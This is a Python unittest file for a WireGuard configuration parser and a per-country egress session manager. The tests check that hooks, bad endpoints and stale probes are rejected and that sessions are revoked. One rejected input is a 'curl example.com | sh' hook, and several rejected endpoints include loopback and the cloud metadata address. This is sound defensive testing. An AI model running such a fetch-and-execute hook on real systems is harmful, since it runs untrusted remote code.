import base64
import unittest
from scripts.egress_config import parse_wireguard
from scripts.egress_sessions import Sessions, Evidence

KEY = base64.b64encode(bytes(range(32))).decode()
CONFIG = f'''[Interface]
PrivateKey = {KEY}
Address = 10.2.0.2/32
DNS = 1.1.1.1
[Peer]
PublicKey = {KEY}
AllowedIPs = 0.0.0.0/0
Endpoint = 8.8.8.8:51820
'''


class WireGuardBoundaryTests(unittest.TestCase):
    def test_separates_interface_changes_from_wg_input(self):
        result = parse_wireguard(CONFIG)
        self.assertNotIn('Address', result['wg_config'])
        self.assertNotIn('DNS', result['wg_config'])
        self.assertEqual(result['addresses'], ['10.2.0.2/32'])
        self.assertFalse(result['ipv6_requested'])

    def test_rejects_hooks_unknown_fields_and_duplicates(self):
        for line in ['PostUp = curl example.com | sh', 'Table = auto', 'SaveConfig = true',
                     'PrivateKey = ' + KEY]:
            with self.subTest(line=line), self.assertRaises(ValueError):
                parse_wireguard(CONFIG.replace('[Peer]', line + '\n[Peer]'))

    def test_rejects_private_hostname_and_invalid_endpoint(self):
        for endpoint in ['127.0.0.1:80', '169.254.169.254:80', 'vpn.example.com:443',
                         '8.8.8.8:0', '8.8.8.8:65536', '[::1]:443']:
            with self.subTest(endpoint=endpoint), self.assertRaises(ValueError):
                parse_wireguard(CONFIG.replace('8.8.8.8:51820', endpoint))

    def test_ipv6_endpoint_and_full_dual_stack(self):
        result = parse_wireguard(CONFIG.replace('8.8.8.8:51820', '[2606:4700:4700::1111]:443')
                                 .replace('0.0.0.0/0', '0.0.0.0/0, ::/0'))
        self.assertTrue(result['ipv6_requested'])

    def test_rejects_partial_routes_bad_key_and_extra_peer(self):
        for text in [CONFIG.replace('0.0.0.0/0', '10.0.0.0/8'),
                     CONFIG.replace(KEY, 'bad'), CONFIG + '[Peer]\n',
                     CONFIG + 'PersistentKeepalive = 999\n']:
            with self.assertRaises(ValueError):
                parse_wireguard(text)


class SessionIsolationTests(unittest.TestCase):
    def setUp(self):
        self.now = 100
        self.sessions = Sessions(clock=lambda: self.now)
        for pool, country in [('de', 'DE'), ('jp', 'JP')]:
            self.sessions.register(pool, country, 'fixture', 'wireguard', True)
            self.ready(pool, Evidence(country, True, True, True, True, True, 200))

    def ready(self, pool, evidence):
        self.sessions.mark_ready(pool, evidence, ticket=self.sessions.begin_probe(pool))

    def test_country_choices_are_independent(self):
        a, b = self.sessions.issue('DE'), self.sessions.issue('JP')
        self.assertNotEqual(a, b)
        self.assertEqual(self.sessions.resolve(a), 'de')
        self.assertEqual(self.sessions.resolve(b), 'jp')
        self.sessions.fail('de')
        with self.assertRaises(ValueError):
            self.sessions.resolve(a)
        self.assertEqual(self.sessions.resolve(b), 'jp')
        with self.assertRaises(ValueError):
            self.sessions.issue('DE')

    def test_expiry_fails_closed(self):
        token = self.sessions.issue('DE')
        self.now = 200
        with self.assertRaises(ValueError):
            self.sessions.resolve(token)

    def test_tcp_only_cannot_satisfy_udp(self):
        self.ready('de', Evidence('DE', True, False, True, True, True, 200))
        with self.assertRaises(ValueError):
            self.sessions.issue('DE')
        self.assertEqual(self.sessions.resolve(self.sessions.issue('DE', False)), 'de')

    def test_wrong_country_and_failed_safety_revoke(self):
        for evidence in [Evidence('US', True, True, True, True, True, 200),
                         Evidence('DE', True, True, True, True, False, 200)]:
            with self.assertRaises(ValueError):
                self.ready('de', evidence)
            with self.assertRaises(ValueError):
                self.sessions.issue('DE')

    def test_permission_capacity_and_unknown_session(self):
        with self.assertRaises(ValueError):
            self.sessions.register('fr', 'FR', 'fixture', 'wireguard')
        with self.assertRaises(ValueError):
            self.sessions.resolve('untrusted')
        self.sessions.max_sessions = 1
        self.sessions.issue('DE')
        with self.assertRaises(ValueError):
            self.sessions.issue('JP')

    def test_truthy_strings_cannot_approve_or_verify(self):
        with self.assertRaises(ValueError):
            self.sessions.register('fr', 'FR', 'fixture', 'wireguard', 'false')
        with self.assertRaises(ValueError):
            self.ready('de', Evidence('DE', True, 'false', True, True, True, 200))

    def test_nonboolean_udp_requirement_rejected(self):
        with self.assertRaises(ValueError):
            self.sessions.issue('DE', 'false')

    def test_old_probe_cannot_revive_replaced_pool(self):
        ticket = self.sessions.begin_probe('de')
        self.sessions.remove('de')
        self.sessions.register('de', 'DE', 'fixture', 'wireguard', True)
        with self.assertRaises(ValueError):
            self.sessions.mark_ready('de', Evidence('DE', True, True, True, True, True, 200), ticket=ticket)
        with self.assertRaises(ValueError):
            self.sessions.issue('DE')

    def test_late_failure_does_not_revoke_newer_success(self):
        old = self.sessions.begin_probe('de')
        new = self.sessions.begin_probe('de')
        evidence = Evidence('DE', True, True, True, True, True, 200)
        self.sessions.mark_ready('de', evidence, ticket=new)
        with self.assertRaises(ValueError):
            self.sessions.mark_ready('de', Evidence('DE', False, False, False, False, False, 200), ticket=old)
        self.assertEqual(self.sessions.resolve(self.sessions.issue('DE')), 'de')

    def test_failure_invalidates_pending_probe(self):
        ticket = self.sessions.begin_probe('de')
        self.sessions.fail('de')
        with self.assertRaises(ValueError):
            self.sessions.mark_ready('de', Evidence('DE', True, True, True, True, True, 200), ticket=ticket)

    def test_removal_revokes_sessions(self):
        token = self.sessions.issue('DE')
        self.sessions.remove('de')
        with self.assertRaises(ValueError):
            self.sessions.resolve(token)
